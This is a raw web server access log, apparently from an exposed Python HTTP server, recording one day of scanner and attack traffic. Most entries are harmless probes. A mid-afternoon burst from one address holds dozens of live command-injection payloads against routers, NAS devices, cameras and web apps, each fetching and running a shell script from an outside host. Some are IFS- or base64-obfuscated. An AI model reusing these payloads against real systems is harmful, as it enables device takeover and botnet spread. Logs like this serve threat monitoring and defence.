+205.210.31.220 - - [30/Aug/2026 04:01:31] code 400, message Bad request version ('À\\x13À')
+205.210.31.220 - - [30/Aug/2026 04:01:31] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x93þq&à\x9a«\x96OwËtm\x0cDV \x87\x04¢ã3Åë\x9a\x97Û^\x09T\x09ñ ¿Ì\x98mq\x9alÇN\x80ä!¯ÁÔ²ë\x9dt¾ ¸ |ôÆ£Ð\x86\x95,Á\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" 400 -
+205.210.31.220 - - [30/Aug/2026 04:01:32] code 400, message Bad request version ('À(À$À\\x14À')
+205.210.31.220 - - [30/Aug/2026 04:01:32] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03}\x87\x83\x9cí\x9bZ\x10C¼Q'Zµad"Yù\x86^i\x1cpªÃ¿\x7f&Ó5;\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" 400 -
+3.86.250.116 - - [30/Aug/2026 06:02:07] "GET / HTTP/1.1" 200 -
+65.49.20.68 - - [30/Aug/2026 07:01:54] "GET / HTTP/1.1" 200 -
+65.49.20.116 - - [30/Aug/2026 07:03:23] code 404, message File not found
+65.49.20.116 - - [30/Aug/2026 07:03:23] "GET /favicon.ico HTTP/1.1" 404 -
+65.49.20.112 - - [30/Aug/2026 07:06:13] code 404, message File not found
+65.49.20.112 - - [30/Aug/2026 07:06:13] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 -
+65.49.20.76 - - [30/Aug/2026 07:06:42] code 501, message Unsupported method ('CONNECT')
+65.49.20.76 - - [30/Aug/2026 07:06:42] "CONNECT www.shadowserver.org:443 HTTP/1.1" 501 -
+65.49.20.68 - - [30/Aug/2026 07:07:00] code 404, message File not found
+65.49.20.68 - - [30/Aug/2026 07:07:00] "GET /geoserver/web/ HTTP/1.1" 404 -
+45.135.193.198 - - [30/Aug/2026 07:49:23] code 400, message Bad request syntax ("\\x16\\x03\\x01\\x00ê\\x01\\x00\\x00æ\\x03\\x03'£¯7æ")
+45.135.193.198 - - [30/Aug/2026 07:49:23] "\x16\x03\x01\x00ê\x01\x00\x00æ\x03\x03'£¯7æ" 400 -
+45.135.193.198 - - [30/Aug/2026 07:49:23] "GET / HTTP/1.0" 200 -
+94.154.43.140 - - [30/Aug/2026 07:50:55] code 404, message File not found
+94.154.43.140 - - [30/Aug/2026 07:50:55] "GET /login HTTP/1.1" 404 -
+45.198.224.27 - - [30/Aug/2026 08:23:52] code 501, message Unsupported method ('POST')
+45.198.224.27 - - [30/Aug/2026 08:23:52] "POST /goform/set_LimitClient_cfg HTTP/1.1" 501 -
+112.158.236.136 - - [30/Aug/2026 08:42:03] code 400, message Bad HTTP/0.9 request type ('\\x16\\x03\\x01\\x01\\x89\\x01\\x00\\x01')
+112.158.236.136 - - [30/Aug/2026 08:42:03] "\x16\x03\x01\x01\x89\x01\x00\x01\x85\x03\x03j\x94kg8Ñ'jÀqe;û+ÓWw\x02üA7¢lmQâ£§×ækÇ\x00\x01\x14Ì¨Ì©ÌªÀ,À0\x00\x9fÀ­À\x9fÀ$À(\x00kÀ" 400 -
+142.93.224.178 - - [30/Aug/2026 08:56:32] "GET / HTTP/1.1" 200 -
+142.93.224.178 - - [30/Aug/2026 08:56:41] code 400, message Bad request version ("x64|'|'|No|'|'|S17|'|'|..|'|'|SW5ib3ggLSBPdXRsb29rIERhdGEgRmlsZSAtIE1pY3Jvc29mdCBPdXRsb29rAA==|'|'|")
+142.93.224.178 - - [30/Aug/2026 08:56:41] "238\x00ll|'|'|SGFjS2VkX0Q3NUU2QUFB|'|'|WIN-QZN7FJ7D1O|'|'|Administrator|'|'|19-11-28|'|'||'|'|Win 10 Pro x64|'|'|No|'|'|S17|'|'|..|'|'|SW5ib3ggLSBPdXRsb29rIERhdGEgRmlsZSAtIE1pY3Jvc29mdCBPdXRsb29rAA==|'|'|" 400 -
+137.184.237.143 - - [30/Aug/2026 09:09:52] "GET / HTTP/1.1" 200 -
+137.184.237.143 - - [30/Aug/2026 09:09:53] code 404, message File not found
+137.184.237.143 - - [30/Aug/2026 09:09:53] "GET /favicon.ico HTTP/1.1" 404 -
+94.154.43.140 - - [30/Aug/2026 09:31:49] code 404, message File not found
+94.154.43.140 - - [30/Aug/2026 09:31:49] "GET /login HTTP/1.1" 404 -
+94.154.43.70 - - [30/Aug/2026 09:48:36] code 404, message File not found
+94.154.43.70 - - [30/Aug/2026 09:48:36] "GET /login HTTP/1.1" 404 -
+154.90.70.254 - - [30/Aug/2026 10:03:07] code 404, message File not found
+154.90.70.254 - - [30/Aug/2026 10:03:07] "GET /v1/models HTTP/1.1" 404 -
+154.90.70.254 - - [30/Aug/2026 10:03:07] code 404, message File not found
+154.90.70.254 - - [30/Aug/2026 10:03:07] "GET /health HTTP/1.1" 404 -
+64.62.156.10 - - [30/Aug/2026 10:08:46] code 400, message Bad HTTP/0.9 request type ('\\x16\\x03\\x01\\x00{\\x01\\x00\\x00w\\x03\\x03)±\\x00¾\\x8e½\\x8b\\x94\\x97b¯ÈÆ\\x9c\\x9c\\x10\\x9cè\\x17\\x06t\\x8aªùÛ%}\\x06º¦¡C\\x00\\x00\\x1aÀ/À+À\\x11À\\x07À\\x13À')
+64.62.156.10 - - [30/Aug/2026 10:08:46] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03)±\x00¾\x8e½\x8b\x94\x97b¯ÈÆ\x9c\x9c\x10\x9cè\x17\x06t\x8aªùÛ%}\x06º¦¡C\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" 400 -
+94.154.43.140 - - [30/Aug/2026 10:15:05] code 404, message File not found
+94.154.43.140 - - [30/Aug/2026 10:15:05] "GET /login HTTP/1.1" 404 -
+195.182.16.23 - - [30/Aug/2026 10:49:34] code 404, message File not found
+195.182.16.23 - - [30/Aug/2026 10:49:34] "GET /SDK/webLanguage HTTP/1.1" 404 -
+152.243.213.247 - - [30/Aug/2026 11:04:13] code 404, message File not found
+152.243.213.247 - - [30/Aug/2026 11:04:13] "GET http://a7x.overflow.biz/hachk.php HTTP/1.1" 404 -
+45.198.224.27 - - [30/Aug/2026 11:10:45] code 404, message File not found
+45.198.224.27 - - [30/Aug/2026 11:10:45] "GET /login HTTP/1.1" 404 -
+204.76.203.49 - - [30/Aug/2026 11:29:15] code 501, message Unsupported method ('CONNECT')
+204.76.203.49 - - [30/Aug/2026 11:29:15] "CONNECT api.i.pn:443 HTTP/1.1" 501 -
+204.76.203.49 - - [30/Aug/2026 11:29:20] code 400, message Bad request syntax ('\\x05\\x01\\x00')
+204.76.203.49 - - [30/Aug/2026 11:29:20] "\x05\x01\x00" 400 -
+168.107.6.123 - - [30/Aug/2026 11:55:03] "GET / HTTP/1.0" 200 -
+216.180.246.219 - - [30/Aug/2026 12:26:49] "GET / HTTP/1.0" 200 -
+216.180.246.219 - - [30/Aug/2026 12:28:01] "GET / HTTP/1.0" 200 -
+216.180.246.219 - - [30/Aug/2026 12:28:27] code 400, message Bad request version ('À\\x14À')
+216.180.246.219 - - [30/Aug/2026 12:28:27] "\x16\x03\x01\x00ý\x01\x00\x00ù\x03\x03]=\x9eÍI\x83\x88'MgBkkõFÚN)­\x8b-û£\x990¿#ãnvß\x06 \x13áû¹¦<-¾"È\x8d5ÒµuÞ\x06¡\x94ØtÇ\x1cY¬ÂÙ#üéH}\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+216.180.246.219 - - [30/Aug/2026 12:28:33] "GET / HTTP/1.1" 200 -
+216.180.246.219 - - [30/Aug/2026 12:28:35] code 404, message File not found
+216.180.246.219 - - [30/Aug/2026 12:28:35] "GET /manage/account/login HTTP/1.1" 404 -
+216.180.246.219 - - [30/Aug/2026 12:28:37] code 404, message File not found
+216.180.246.219 - - [30/Aug/2026 12:28:37] "GET /admin/index.html HTTP/1.1" 404 -
+216.180.246.219 - - [30/Aug/2026 12:28:38] "GET /index.html HTTP/1.1" 200 -
+216.180.246.219 - - [30/Aug/2026 12:28:39] code 404, message File not found
+216.180.246.219 - - [30/Aug/2026 12:28:39] "GET /+CSCOE+/logon.html HTTP/1.1" 404 -
+216.180.246.219 - - [30/Aug/2026 12:28:39] code 404, message File not found
+216.180.246.219 - - [30/Aug/2026 12:28:39] "GET /cgi-bin/login.cgi HTTP/1.1" 404 -
+216.180.246.219 - - [30/Aug/2026 12:28:40] code 404, message File not found
+216.180.246.219 - - [30/Aug/2026 12:28:40] "GET /login.htm HTTP/1.1" 404 -
+216.180.246.219 - - [30/Aug/2026 12:28:43] code 404, message File not found
+216.180.246.219 - - [30/Aug/2026 12:28:43] "GET /login.html HTTP/1.1" 404 -
+216.180.246.219 - - [30/Aug/2026 12:28:43] code 404, message File not found
+216.180.246.219 - - [30/Aug/2026 12:28:43] "GET /login.jsp HTTP/1.1" 404 -
+216.180.246.219 - - [30/Aug/2026 12:28:45] code 404, message File not found
+216.180.246.219 - - [30/Aug/2026 12:28:45] "GET /login HTTP/1.1" 404 -
+216.180.246.219 - - [30/Aug/2026 12:28:46] code 404, message File not found
+216.180.246.219 - - [30/Aug/2026 12:28:46] "GET /doc/index.html HTTP/1.1" 404 -
+216.180.246.219 - - [30/Aug/2026 12:28:46] code 404, message File not found
+216.180.246.219 - - [30/Aug/2026 12:28:46] "GET /remote/login HTTP/1.1" 404 -
+216.180.246.219 - - [30/Aug/2026 12:28:46] code 404, message File not found
+216.180.246.219 - - [30/Aug/2026 12:28:46] "GET /admin/login.asp HTTP/1.1" 404 -
+216.180.246.219 - - [30/Aug/2026 12:28:46] code 404, message File not found
+216.180.246.219 - - [30/Aug/2026 12:28:46] "GET /web/ HTTP/1.1" 404 -
+216.180.246.219 - - [30/Aug/2026 12:28:47] code 404, message File not found
+216.180.246.219 - - [30/Aug/2026 12:28:47] "GET /webpages/login.html HTTP/1.1" 404 -
+216.180.246.219 - - [30/Aug/2026 12:28:47] code 404, message File not found
+216.180.246.219 - - [30/Aug/2026 12:28:47] "GET /favicon.ico HTTP/1.1" 404 -
+43.136.53.215 - - [30/Aug/2026 12:31:46] "GET / HTTP/1.0" 200 -
+64.227.136.95 - - [30/Aug/2026 12:41:45] code 501, message Unsupported method ('CONNECT')
+64.227.136.95 - - [30/Aug/2026 12:41:45] "CONNECT / HTTP/1.1" 501 -
+205.210.31.94 - - [30/Aug/2026 12:48:36] code 404, message File not found
+205.210.31.94 - - [30/Aug/2026 12:48:36] "GET /.well-known/security.txt HTTP/1.1" 404 -
+34.6.238.64 - - [30/Aug/2026 13:01:17] "GET / HTTP/1.0" 200 -
+77.90.185.226 - - [30/Aug/2026 13:24:10] "GET / HTTP/1.1" 200 -
+219.140.109.106 - - [30/Aug/2026 13:30:31] code 404, message File not found
+219.140.109.106 - - [30/Aug/2026 13:30:31] "GET /v1/models HTTP/1.1" 404 -
+94.154.43.70 - - [30/Aug/2026 13:34:27] code 404, message File not found
+94.154.43.70 - - [30/Aug/2026 13:34:27] "GET /login HTTP/1.1" 404 -
+94.154.43.70 - - [30/Aug/2026 14:11:08] code 404, message File not found
+94.154.43.70 - - [30/Aug/2026 14:11:08] "GET /login HTTP/1.1" 404 -
+94.154.43.201 - - [30/Aug/2026 15:07:11] code 404, message File not found
+94.154.43.201 - - [30/Aug/2026 15:07:11] "GET /login HTTP/1.1" 404 -
+172.203.211.171 - - [30/Aug/2026 15:13:36] code 400, message Bad request syntax ('MGLNDD_178.104.53.233_8080')
+172.203.211.171 - - [30/Aug/2026 15:13:36] "MGLNDD_178.104.53.233_8080" 400 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] "GET / HTTP/1.1" 200 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:24] "POST /druid/indexer/v1/sampler HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:24] "POST /cgi-bin/system_log.cgi HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:24] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=`cd${IFS}/tmp;rm${IFS}-rf${IFS}wget.sh;wget${IFS}http://118.145.196.225:800/wget.sh;busybox${IFS}wget${IFS}http://118.145.196.225:800/wget.sh;sh${IFS}wget.sh${IFS}netgear;` HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] "POST /boardDataWW.php HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:24] "POST /user.cgi HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:24] "POST /action/SetRemoteAccessCfg HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] "POST /goform/setUsbUnload HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] "GET /shell?`cd${IFS}/tmp;rm${IFS}-rf${IFS}wget.sh;wget${IFS}http://118.145.196.225:800/wget.sh;busybox${IFS}wget${IFS}http://118.145.196.225:800/wget.sh;sh${IFS}wget.sh${IFS}mvpower;` HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] "GET /manager?action=getlogcat&region=maintenance&tag=1&priority=D;cd%24%7BIFS%7D%2Ftmp%3Brm%24%7BIFS%7D-rf%24%7BIFS%7Dwget.sh%3Bwget%24%7BIFS%7Dhttp%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3Bbusybox%24%7BIFS%7Dwget%24%7BIFS%7Dhttp%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3Bsh%24%7BIFS%7Dwget.sh%24%7BIFS%7Dgxv3240%3B HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] "POST /GponForm/diag_Form?style/ HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:24] "GET /adv,/cgi-bin/weblogin.cgi?username=admin%27%3Bcd$%7BIFS%7D%2Ftmp%3Brm$%7BIFS%7D-rf$%7BIFS%7Dwget.sh%3Bwget$%7BIFS%7Dhttp:%2F%2F118.145.196.225:800%2Fwget.sh%3Bbusybox$%7BIFS%7Dwget$%7BIFS%7Dhttp:%2F%2F118.145.196.225:800%2Fwget.sh%3Bsh$%7BIFS%7Dwget.sh$%7BIFS%7Dzyxel.nas%3B&password=cling HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:24] "GET /backupmgt/localJob.php?session=fail%3Bcd$%7BIFS%7D%2Ftmp%3Brm$%7BIFS%7D-rf$%7BIFS%7Dwget.sh%3Bwget$%7BIFS%7Dhttp:%2F%2F118.145.196.225:800%2Fwget.sh%3Bbusybox$%7BIFS%7Dwget$%7BIFS%7Dhttp:%2F%2F118.145.196.225:800%2Fwget.sh%3Bsh$%7BIFS%7Dwget.sh$%7BIFS%7Dseagate.nas%3B HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:24] "GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=';cd${IFS}/tmp;rm${IFS}-rf${IFS}wget.sh;wget${IFS}http://118.145.196.225:800/wget.sh;busybox${IFS}wget${IFS}http://118.145.196.225:800/wget.sh;sh${IFS}wget.sh${IFS}dlink;;' HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:24] "POST /cgi-bin/server/server.cgi?func=server02_main_submit&counter=8.540406879901406&APPLY= HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:24] "POST /cgi-bin/prog.cgi HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:24] "POST /cgi-bin/cloud_update.cgi HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:24] "POST /cgi-bin/cstecgi.cgi HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:24] "POST /cgi-bin/prog.cgi HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:24] "POST /app/options.py HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:24] "POST /cgi-bin/cstecgi.cgi HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:24] "GET /p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=cd${IFS}/tmp;rm${IFS}-rf${IFS}wget.sh;wget${IFS}http://118.145.196.225:800/wget.sh;busybox${IFS}wget${IFS}http://118.145.196.225:800/wget.sh;sh${IFS}wget.sh${IFS}plone; HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:24] "POST /res.php HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:24] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:24] "GET /goform/setUsbUnload/.js?deviceName=A;cd%24%7BIFS%7D%2Ftmp%3Brm%24%7BIFS%7D-rf%24%7BIFS%7Dwget.sh%3Bwget%24%7BIFS%7Dhttp%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3Bbusybox%24%7BIFS%7Dwget%24%7BIFS%7Dhttp%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3Bsh%24%7BIFS%7Dwget.sh%24%7BIFS%7Dtenda.ac%3B HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:26] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:26] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:26] "POST /cgi-bin/system.cgi HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:26] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:26] "POST /admin.cgi?action=config_save HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:26] "GET /cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type='`cd${IFS}/tmp;rm${IFS}-rf${IFS}wget.sh;wget${IFS}http://118.145.196.225:800/wget.sh;busybox${IFS}wget${IFS}http://118.145.196.225:800/wget.sh;sh${IFS}wget.sh${IFS}zeroshell;`' HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:26] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:26] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:26] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:26] "GET /goform/smacfilter_conf?name=%3Bcd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+busybox+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+sh+wget.sh+aitemi.m300%3B HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:26] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:26] "POST /web/cgi-bin/usbinteract.cgi HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:26] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:26] "GET /user.cgi?NDDNS_ENABLE=1&DDNS_WILDCARD=1&DDNS_BACKUP_MX=0&SERVICE=ddns&DDNS_PROVIDER=0&DDNS_TYPE=0&DDNS_HOST=`cd${IFS}/tmp;rm${IFS}-rf${IFS}wget.sh;wget${IFS}http://118.145.196.225:800/wget.sh;busybox${IFS}wget${IFS}http://118.145.196.225:800/wget.sh;sh${IFS}wget.sh${IFS}arris;` HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:26] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:26] "GET /cgi-bin/popen.cgi?command=%60cd$%7BIFS%7D%2Ftmp%3Brm$%7BIFS%7D-rf$%7BIFS%7Dwget.sh%3Bwget$%7BIFS%7Dhttp:%2F%2F118.145.196.225:800%2Fwget.sh%3Bbusybox$%7BIFS%7Dwget$%7BIFS%7Dhttp:%2F%2F118.145.196.225:800%2Fwget.sh%3Bsh$%7BIFS%7Dwget.sh$%7BIFS%7Dhytec%3B%60&v=0.1303033443137912 HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:26] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:26] "GET /card_scan.php?No=30&ReaderNo=`cd${IFS}/tmp;rm${IFS}-rf${IFS}wget.sh;wget${IFS}http://118.145.196.225:800/wget.sh;busybox${IFS}wget${IFS}http://118.145.196.225:800/wget.sh;sh${IFS}wget.sh${IFS}nortek;` HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:26] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:26] "POST /cgi-bin/prog.cgi HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:26] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:26] "POST /ztp/cgi-bin/handler HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:26] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:26] "POST /goform/set_prohibiting HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:26] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:26] "GET /manager?action=starttraceroute&addr=||echo$IFS"Y2Qke0lGU30vdG1wO3JtJHtJRlN9LXJmJHtJRlN9d2dldC5zaDt3Z2V0JHtJRlN9aHR0cDovLzExOC4xNDUuMTk2LjIyNTo4MDAvd2dldC5zaDtidXN5Ym94JHtJRlN9d2dldCR7SUZTfWh0dHA6Ly8xMTguMTQ1LjE5Ni4yMjU6ODAwL3dnZXQuc2g7c2gke0lGU313Z2V0LnNoJHtJRlN9Z2FjMjUwMDs="|base64$IFS-d|sh HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:26] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:26] "POST /goform/WriteFacMac HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:26] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:26] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:26] "GET /manager?action=getlogcat&tag=1&priority=D;cd%24%7BIFS%7D%2Ftmp%3Brm%24%7BIFS%7D-rf%24%7BIFS%7Dwget.sh%3Bwget%24%7BIFS%7Dhttp%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3Bbusybox%24%7BIFS%7Dwget%24%7BIFS%7Dhttp%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3Bsh%24%7BIFS%7Dwget.sh%24%7BIFS%7Dgxv2200%3B HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:26] "GET /dnslookup.cgi?host_name=www.google.com;cd${IFS}/tmp;rm${IFS}-rf${IFS}wget.sh;wget${IFS}http://118.145.196.225:800/wget.sh;busybox${IFS}wget${IFS}http://118.145.196.225:800/wget.sh;sh${IFS}wget.sh${IFS}netgear;&lookup=Lookup&ess_=true HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:26] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:26] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:26] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:26] "GET /public/template.cgi?templatefile=$%28cd$%7BIFS%7D%2Ftmp%3Brm$%7BIFS%7D-rf$%7BIFS%7Dwget.sh%3Bwget$%7BIFS%7Dhttp:%2F%2F118.145.196.225:800%2Fwget.sh%3Bbusybox$%7BIFS%7Dwget$%7BIFS%7Dhttp:%2F%2F118.145.196.225:800%2Fwget.sh%3Bsh$%7BIFS%7Dwget.sh$%7BIFS%7Dmeteobridge%3B%29 HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:26] "POST /pages/createpage-entervariables.action?Spacekey=x HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:26] "GET /cgi/bin;/board.cgi?cmd=`cd${IFS}/tmp;rm${IFS}-rf${IFS}wget.sh;wget${IFS}http://118.145.196.225:800/wget.sh;busybox${IFS}wget${IFS}http://118.145.196.225:800/wget.sh;sh${IFS}wget.sh${IFS}vacron;` HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:26] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:26] "POST /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:27] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:27] "POST /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:27] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:27] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:27] "POST /cgi-bin/luci/;stok=/locale?form=country HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:27] "POST /goform/exeCommand HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:27] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:27] "GET /goform/smacfilter_conf?enable=%3Bcd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+busybox+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+sh+wget.sh+aitemi.m300%3B HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:27] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:27] "GET /goform/smacfilter_conf?mac=%3Bcd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+busybox+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+sh+wget.sh+aitemi.m300%3B HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:28] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:28] "POST /HNAP1/ HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:28] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:28] "GET /remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`cd${IFS}/tmp;rm${IFS}-rf${IFS}wget.sh;wget${IFS}http://118.145.196.225:800/wget.sh;busybox${IFS}wget${IFS}http://118.145.196.225:800/wget.sh;sh${IFS}wget.sh${IFS}cacti;` HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:28] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:28] "GET /form/smacfilter_conf?name=%3Bcd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+busybox+wget+http%3A%2F%2F118.145.196.225%3A800%2Fwget.sh%3B+sh+wget.sh+aitemi.m300%3B HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:29] code 404, message File not found
+85.11.167.132 - - [30/Aug/2026 15:33:29] "GET /gena.cgi?service=`cd${IFS}/tmp;rm${IFS}-rf${IFS}wget.sh;wget${IFS}http://118.145.196.225:800/wget.sh;busybox${IFS}wget${IFS}http://118.145.196.225:800/wget.sh;sh${IFS}wget.sh${IFS}dlink;` HTTP/1.1" 404 -
+85.11.167.132 - - [30/Aug/2026 15:33:31] code 501, message Unsupported method ('POST')
+85.11.167.132 - - [30/Aug/2026 15:33:31] "POST /manager_dev_ping_t HTTP/1.1" 501 -
+85.11.167.132 - - [30/Aug/2026 15:33:31] code 404, message File not found
